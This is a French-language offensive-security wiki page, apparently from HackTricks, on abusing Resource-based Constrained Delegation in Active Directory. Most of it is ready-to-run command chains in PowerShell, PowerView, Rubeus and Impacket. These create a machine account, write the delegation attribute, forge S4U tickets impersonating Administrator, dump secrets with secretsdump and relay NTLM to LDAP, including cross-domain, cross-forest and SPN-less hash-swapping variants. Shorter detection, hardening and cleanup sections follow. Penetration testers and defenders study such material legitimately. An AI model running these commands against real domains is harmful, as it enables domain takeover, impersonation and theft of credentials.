# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Principes de base de la Resource-based Constrained Delegation

La délégation contrainte basée sur les ressources (RBCD) est similaire à la [délégation contrainte](constrained-delegation.md), mais le sens de confiance est inversé. La délégation contrainte traditionnelle enregistre les services auxquels un principal peut déléguer ; la RBCD enregistre sur la **ressource cible** les principals autorisés à usurper l'identité d'utilisateurs auprès de celle-ci.<sup>[[12]](#references)</sup>

L'attribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ de l'objet cible contient un descripteur de sécurité qui identifie les principals autorisés à agir au nom d'autres identités auprès de cette ressource.

Une autre différence importante est qu'un principal disposant de **permissions d'écriture suffisantes sur un compte machine** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` et des droits similaires) peut être en mesure de définir _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. La configuration de la délégation contrainte traditionnelle nécessite normalement un accès administratif plus privilégié.<sup>[[1]](#references)</sup>

Plus précisément, la modification des paramètres classiques de délégation contrainte est normalement soumise à `SeEnableDelegationPrivilege` sur un contrôleur de domaine, un droit généralement détenu par des administrateurs hautement privilégiés. La RBCD transfère la décision au descripteur de sécurité de l'objet cible ; un droit d'écriture sur la propriété pertinente de l'objet ordinateur peut donc suffire, sans que l'utilisateur ait besoin de ce droit.<sup>[[1]](#references)[[2]](#references)</sup>

### Nouveaux concepts

L'indicateur **`TrustedToAuthForDelegation`** dans `userAccountControl` est souvent présenté comme un prérequis à **S4U2Self**, mais c'est inexact.\
Un principal de service avec un SPN peut demander S4U2Self sans cet indicateur. Avec `TrustedToAuthForDelegation`, le ticket de service renvoyé est **transmissible** ; sans cet indicateur, le ticket est normalement **non transmissible**.<sup>[[5]](#references)</sup>

La délégation contrainte traditionnelle rejette un **TGS non transmissible** lors de l'étape S4U2Proxy. La RBCD peut accepter ce ticket S4U2Self si le descripteur de sécurité de la cible autorise le service demandeur.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Structure de l'attaque

> Si vous disposez de **privilèges équivalents à des droits d'écriture** sur un **compte ordinateur**, vous pourriez obtenir un accès privilégié à cette machine.

Supposons que l'attaquant dispose déjà de **privilèges équivalents à des droits d'écriture sur l'objet ordinateur de la victime**.

1. L'attaquant **compromet** un compte avec un **SPN** ou **en crée un** (« Service A »). Par défaut, un utilisateur authentifié du domaine peut créer jusqu'à 10 objets ordinateur, conformément à **_MachineAccountQuota_** ; un objet ordinateur fournit automatiquement des SPN utilisables.
2. L'attaquant **abuse de son privilège WRITE** sur l'ordinateur de la victime (ServiceB) pour configurer la **délégation contrainte basée sur les ressources afin d'autoriser ServiceA à usurper l'identité de n'importe quel utilisateur** auprès de cet ordinateur victime (ServiceB).
3. L'attaquant utilise Rubeus pour effectuer une **attaque S4U complète** (S4U2Self et S4U2Proxy) de Service A vers Service B au nom d'un utilisateur **disposant d'un accès privilégié à Service B**.
   1. S4U2Self (à partir du compte SPN compromis ou créé) : demander un **TGS représentant Administrator auprès de Service A** (non transmissible).
   2. S4U2Proxy : utiliser ce **TGS non transmissible** pour demander un ticket de service représentant **Administrator** auprès de l'**hôte victime**.
   3. Le ticket non transmissible peut tout de même fonctionner dans ce flux RBCD, car Service A est autorisé dans le descripteur de sécurité de la ressource cible.
4. L'attaquant peut effectuer un **pass-the-ticket** et **usurper l'identité** de l'utilisateur pour obtenir un **accès à la victime ServiceB**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` ferme la voie par défaut de création d'ordinateurs, mais ne supprime ni les droits d'écriture sur l'objet ordinateur cible ni le contrôle d'un compte existant. Un utilisateur ordinaire contrôlé, sans SPN, peut parfois servir de principal délégant via la [méthode U2U sans SPN](#spn-less-cross-domain--cross-forest-rbcd), y compris au sein d'un même domaine. Cette voie nécessite toujours un droit d'écriture RBCD effectif, le contrôle des identifiants de l'utilisateur délégant, une identité usurpée pouvant être déléguée, un comportement de chiffrement Kerberos compatible et une modification du hachage NT qui perturbe le compte. Considérez ces éléments comme des prérequis distincts ; un attribut RBCD vide ou un quota nul ne prouve à lui seul ni la réussite ni la sécurité.

Un descripteur RBCD existant peut également désigner un **groupe** plutôt que directement l'ordinateur délégant. Si vous contrôlez un compte ordinateur doté d'un SPN et pouvez l'ajouter à ce groupe, cette nouvelle appartenance peut fournir la voie de délégation sans modifier l'attribut RBCD de l'ordinateur cible. Vérifiez l'ACL effective du groupe autorisant la modification de l'appartenance (y compris les ACE de refus), l'appartenance imbriquée et l'actualisation du jeton, le SID du trustee dans le descripteur, les restrictions de délégation du compte usurpé ainsi que le SPN du service cible avant de conclure que cette voie fonctionne.

Pour vérifier le _**MachineAccountQuota**_ du domaine, vous pouvez utiliser :

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Attaque

### Créer un objet ordinateur

Vous pouvez créer un objet ordinateur dans le domaine à l’aide de **[powermad](https://github.com/Kevin-Robertson/Powermad) :**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Configuration de la délégation contrainte basée sur les ressources

**À l’aide du module PowerShell Active Directory**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**À l’aide de PowerView**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Réaliser une attaque S4U complète (Windows/Rubeus)

Tout d’abord, nous avons créé le nouvel objet Computer avec le mot de passe `123456`. Nous avons donc besoin du hash de ce mot de passe :<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Cela affichera les hashes RC4 et AES de ce compte.\
L’attaque peut alors être menée :<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Vous pouvez générer davantage de tickets pour davantage de services en le demandant une seule fois à l’aide du paramètre `/altservice` de Rubeus :

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Les utilisateurs peuvent être marqués **« Le compte est sensible et ne peut pas être délégué. »** Si cet indicateur est activé, le compte ne peut pas être usurpé via ce flux de délégation. BloodHound expose cette propriété lors de l’analyse.

### Outils Linux : RBCD de bout en bout avec Impacket (2024+)

Si vous opérez depuis Linux, vous pouvez effectuer toute la chaîne RBCD à l’aide des outils officiels d’Impacket :<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Remarques
- Si la signature LDAP/LDAPS est obligatoire, utilisez `impacket-rbcd -use-ldaps ...`.
- Privilégiez les clés AES ; de nombreux domaines modernes limitent RC4. Impacket et Rubeus prennent tous deux en charge les flux AES uniquement.
- Impacket peut réécrire le `sname` (« AnySPN ») pour certains outils, mais obtenez le SPN correct dans la mesure du possible (par exemple, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD inter-domaines et inter-forêts

Si le **principal délégant** que vous contrôlez se trouve dans un **domaine différent** (ou même dans une **forêt différente**) de celui de l’**ordinateur ressource**, l’abus relève toujours du **RBCD**, mais le flux de tickets n’est plus le `S4U2Self -> S4U2Proxy` habituel pour un seul domaine.

### RBCD inter-domaines : configurer le principal étranger à l’aide de son SID

Lorsque vous définissez `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis un **autre domaine**, la machine/utilisateur étranger peut **ne pas être résolu par son nom** dans le LDAP du domaine cible. Dans ce cas, configurez l’entrée de délégation à l’aide du **SID** du principal étranger plutôt que de son sAMAccountName/UPN.

C’est particulièrement pertinent lors du relais de NTLM vers LDAP avec `ntlmrelayx.py` :<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Notes :
- `--sid` indique à `ntlmrelayx.py` de traiter `--escalate-user` comme un SID, ce qui est nécessaire lorsque le compte délégant est étranger au domaine cible.
- Même si l’outil affiche `User not found in LDAP`, l’écriture de la délégation peut tout de même réussir, car le descripteur de sécurité stocke directement le SID étranger.

### RBCD inter-domaines : séquence S4U inter-royaumes

Une fois le principal étranger ajouté à `msDS-AllowedToActOnBehalfOfOtherIdentity`, le flux inter-domaines fonctionnel est le suivant :<sup>[[9]](#references)[[13]](#references)</sup>

1. Obtenir un **TGT** pour le principal délégant depuis son propre domaine.
2. Demander un **TGT de référence** pour `krbtgt/<target-domain>`.
3. Demander une **référence S4U2Self inter-royaumes** pour l’utilisateur usurpé auprès du contrôleur de domaine cible.
4. Demander le ticket **S4U2Self** réel pour cet utilisateur dans le domaine du délégant.
5. Effectuer **S4U2Proxy** dans le domaine du délégant pour obtenir un ticket de référence pour le domaine cible.
6. Effectuer le **S4U2Proxy** final auprès du contrôleur de domaine cible pour obtenir le ticket de service pour `cifs/host.target`, `host/host.target`, etc.

C’est pourquoi les outils Linux standard échouent souvent avec le RBCD inter-domaines :<sup>[[9]](#references)</sup>
- le **realm** de la requête peut devoir différer du realm du TGT utilisé dans le `TGS-REQ`
- la chaîne nécessite des étapes **S4U2Proxy indépendantes**, et non uniquement `S4U2Self` ou `S4U2Self` immédiatement suivi d’un seul `S4U2Proxy`

### RBCD inter-domaines depuis Linux

Synacktiv a publié une implémentation d’Impacket `getST.py` qui reproduit la séquence inter-royaumes depuis Linux en gérant explicitement les deux KDC :<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Sur le plan opérationnel, les nouveaux arguments sont :
- `-dc-ip` : DC du domaine **délégant**
- `-targetdomain` : domaine de l’**ordinateur ressource**
- `-targetdc` : DC du domaine **ressource**

### Limitations de RBCD inter-forêts

RBCD inter-forêts présente une limitation importante : **l’utilisateur usurpé doit appartenir à la même forêt que le principal délégant**. Autrement dit, si votre compte machine contrôlé se trouve dans `valhalla.local` et que la ressource cible se trouve dans `asgard.local`, vous ne pouvez généralement **pas** usurper l’identité d’utilisateurs arbitraires de `asgard.local` auprès de cette ressource via RBCD.<sup>[[9]](#references)</sup>

Cette technique reste exploitable lorsque :
- l’utilisateur de la **forêt délégante** est **administrateur local** (ou dispose d’autres privilèges) sur l’hôte ressource de l’autre forêt
- une relation d’approbation autorise le chemin d’authentification requis et le SID étranger est accepté dans le descripteur de sécurité de l’ordinateur cible

### Particularités du protocole RBCD inter-forêts

RBCD inter-forêts ne se résume pas à « inter-domaines avec une relation d’approbation ». Le flux observé présente deux particularités que les outils courants ne prennent traditionnellement pas en compte :<sup>[[9]](#references)</sup>

1. Une requête **S4U2Proxy** supplémentaire qui définit **`PA-PAC-OPTIONS=branch-aware`**
2. Un ticket de service final qui peut être renvoyé en **RC4**, même lorsque d’autres types de chiffrement ont été demandés

Le flux pratique est le suivant :

1. Obtenir un TGT pour le principal délégant dans la forêt A.
2. Demander **S4U2Self** pour l’utilisateur usurpé dans la forêt A.
3. Demander **S4U2Proxy** dans la forêt A afin d’obtenir un TGT de référence pour la forêt B.
4. Envoyer une deuxième requête **S4U2Proxy** dans la forêt A **sans** le ticket S4U2Self comme ticket supplémentaire, mais avec `branch-aware` activé, afin d’obtenir un autre TGT de référence pour la forêt B.
5. Demander éventuellement un ticket de service classique dans la forêt B pour le principal délégant (ce ticket n’est pas nécessaire à l’exploitation finale).
6. Utiliser les tickets de référence des étapes 3 et 4 pour demander le ticket **S4U2Proxy** final dans la forêt B, pour l’utilisateur de la forêt A usurpé, vers le SPN cible.

### RBCD inter-forêts depuis Linux

La même branche d’Impacket de Synacktiv ajoute une option `-forest` pour cette logique :<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### RBCD récursif dans plusieurs domaines (3+ domaines)

Dans les **forêts à plusieurs domaines**, **S4U2Self** et **S4U2Proxy** peuvent être **récursifs** au lieu de s'arrêter après une seule referral :

- **S4U2Self récursif** : le premier `S4U2Self` est envoyé au **domaine de l'utilisateur usurpé** ; les sauts intermédiaires entre domaines parents et enfants sont parcourus au moyen de referrals `TGS-REQ` classiques pour `krbtgt/<REALM>`, puis le **dernier `S4U2Self`** est envoyé dans le **propre domaine du principal délégant**.
- Cela signifie que **la simple possession d'un TGT** pour un compte machine peut suffire à usurper l'identité d'un **admin d'un autre domaine de la même forêt** et à demander `cifs/host`, `host/host`, `wsman/host`, etc.
- **S4U2Proxy récursif** suit la chaîne d'approbation de la même manière : les sauts intermédiaires réutilisent le ticket précédent comme TGT tout en demandant la referral `krbtgt/<REALM>` suivante ; seul le dernier saut renvoie le ticket de service final.<sup>[[10]](#references)</sup>

Voici un exemple pratique dans une même forêt :

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD inter-domaines / inter-forêts sans SPN

Si le **principal délégant est un utilisateur sans SPN**, le dernier `S4U2Self` récursif échoue avec **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. La solution consiste à **réessayer uniquement le dernier saut avec `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Résumé de la chaîne d’abus :

1. S’authentifier avec le **hash NT** afin d’orienter le KDC vers **RC4-HMAC (etype 23)**.
2. Demander d’abord **`-self -u2u`** et conserver ce ticket à part de l’étape proxy ultérieure.
3. Extraire la **clé de session du TGT** avec `describeTicket.py`.
4. Remplacer le **hash NT** de l’utilisateur par cette **clé de session** avec `changepasswd.py -newhashes <session_key>`.
5. Réutiliser le ticket `S4U2Self+U2U` comme **`-additional-ticket`** lors d’une requête **`-proxy`** distincte.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Précautions opérationnelles :

- Lorsque le **premier saut de confiance mène déjà à une autre forêt**, préférez l’algorithme **branch-aware** (`getST.py ... -forest`) pour correspondre au comportement natif de Windows. Si la forêt étrangère n’est atteinte que **plus tard** dans la chaîne, le flux récursif non branch-aware peut encore fonctionner.<sup>[[9]](#references)</sup>
- Sur les contrôleurs de domaine **Windows Server 2022/2025** récents, le forçage de RC4 peut échouer avec **`KDC_ERR_ETYPE_NOSUPP`** en raison de la dépréciation de RC4 ; cela peut rendre **RBCD sans SPN impossible**, même si le RBCD classique avec SPN fonctionne toujours avec AES.<sup>[[15]](#references)</sup>
- Exécutez **`S4U2Self+U2U` avant de modifier le hash/mot de passe de l’utilisateur** : `SamrChangePasswordUser` ne recalcule **pas** les clés AES Kerberos du compte ; modifier le mot de passe au préalable peut donc compromettre les demandes de tickets ultérieures.<sup>[[14]](#references)</sup>
- Le compte usurpé doit toujours être **délégable** : **Protected Users** et les comptes avec **`NOT_DELEGATED`** / **« Le compte est sensible et ne peut pas être délégué »** bloquent la chaîne.

## Notes de détection / de durcissement

- Les chemins RBCD entre domaines/forêts sont encore généralement créés par **abus d’ACL** ou par **relay-to-LDAP**. Activez la **signature LDAP** et le **channel binding LDAP** sur les contrôleurs de domaine pour bloquer les méthodes de configuration courantes.
- Auditez les personnes autorisées à écrire dans `msDS-AllowedToActOnBehalfOfOtherIdentity` sur les objets ordinateur et résolvez les SID enregistrés, y compris ceux des **foreign security principals**.
- Dans les environnements avec de nombreuses relations d’approbation, examinez **Selective Authentication**, le **filtrage SID** et vérifiez si des utilisateurs d’une forêt étrangère disposent de droits **d’administrateur local** sur les hôtes de ressources.

### Accès

La dernière ligne de commande effectuera l’**attaque S4U complète et injectera le TGS** d’Administrator vers l’hôte victime en **mémoire**.\
Dans cet exemple, un TGS pour le service **CIFS** a été demandé à partir d’Administrator ; vous pourrez donc accéder à **C$** :

```bash
ls \\victim.domain.local\C$
```

### Abuser différents tickets de service

Découvrez les [**tickets de service disponibles ici**](silver-ticket.md#available-services).

## Énumération, audit et nettoyage

### Énumérer les ordinateurs avec RBCD configuré

PowerShell (décodage du SD pour résoudre les SID) :

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (lire ou vider avec une seule commande) :

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Nettoyage / réinitialisation de RBCD

- PowerShell (effacer l’attribut) :

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Erreurs Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`** : cela signifie que Kerberos est configuré pour ne pas utiliser DES ni RC4 et que vous ne fournissez que le hash RC4. Fournissez à Rubeus au moins le hash AES256 (ou fournissez-lui simplement les hashes RC4, AES128 et AES256). Exemple : `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** pendant `-self` pour un utilisateur normal : le principal délégant n’a probablement **pas de SPN**. Réessayez le **dernier saut** en utilisant **`S4U2Self+U2U`** au lieu d’un `S4U2Self` classique.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** pendant une **RBCD sans SPN** : les contrôleurs de domaine récents peuvent rejeter la méthode **RC4-HMAC** forcée, requise par l’astuce `S4U2Self+U2U` + substitution de clé de session. Essayez plutôt une méthode RBCD classique avec SPN et AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`** : cela signifie que l’heure de l’ordinateur actuel diffère de celle du contrôleur de domaine et que Kerberos ne fonctionne pas correctement.
- **`preauth_failed`** : cela signifie que le nom d’utilisateur et les hashes fournis ne permettent pas de se connecter. Vous avez peut-être oublié d’inclure le caractère « $ » dans le nom d’utilisateur lors de la génération des hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** : cela peut signifier que :
  - L’utilisateur que vous essayez d’usurper ne peut pas accéder au service souhaité (parce que vous ne pouvez pas usurper son identité ou qu’il ne dispose pas de privilèges suffisants).
  - Le service demandé n’existe pas (si vous demandez un ticket pour winrm alors que winrm n’est pas en cours d’exécution).
  - L’ordinateur factice créé a perdu ses privilèges sur le serveur vulnérable et vous devez les lui réattribuer.
  - Vous exploitez le KCD classique ; rappelez-vous que RBCD fonctionne avec des tickets S4U2Self non transférables, tandis que KCD exige des tickets transférables.

## Remarques, relais et alternatives

- Vous pouvez aussi écrire le SD RBCD via AD Web Services (ADWS) si LDAP est filtré. Voir :

{{#ref}}
adws-enumeration.md
{{#endref}}

- Les chaînes de relais Kerberos se terminent souvent par RBCD pour obtenir les privilèges SYSTEM local en une seule étape. Voir des exemples pratiques de bout en bout :

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Si la signature LDAP et le channel binding sont **désactivés** et que vous pouvez créer un compte machine, des outils comme **KrbRelayUp** peuvent relayer une authentification Kerberos forcée vers LDAP, définir `msDS-AllowedToActOnBehalfOfOtherIdentity` pour votre compte machine sur l’objet ordinateur cible et usurper immédiatement l’identité d’**Administrator** via S4U depuis une machine externe.<sup>[[8]](#references)</sup>

## References

- [1] [Remuer le chien : exploiter la délégation contrainte basée sur les ressources pour attaquer Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Un autre mot sur la délégation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Délégation contrainte Kerberos basée sur les ressources : prise de contrôle d’un objet ordinateur](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Exploitation abusive de la délégation contrainte basée sur les ressources](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity a tué le domaine : aperçu offensif de Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (officiel)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Aide-mémoire Linux rapide avec la syntaxe récente](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (signature LDAP désactivée → relais Kerberos vers RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploration de RBCD entre domaines et forêts](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploration de RBCD entre domaines et forêts : partie 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Branche Impacket de Synacktiv - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Présentation de la délégation contrainte Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Spécifications ouvertes Microsoft - S4U2Self entre domaines](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Spécifications ouvertes Microsoft - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Détecter et corriger l’utilisation de RC4 dans Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Spécifications ouvertes Microsoft – Détails sur S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
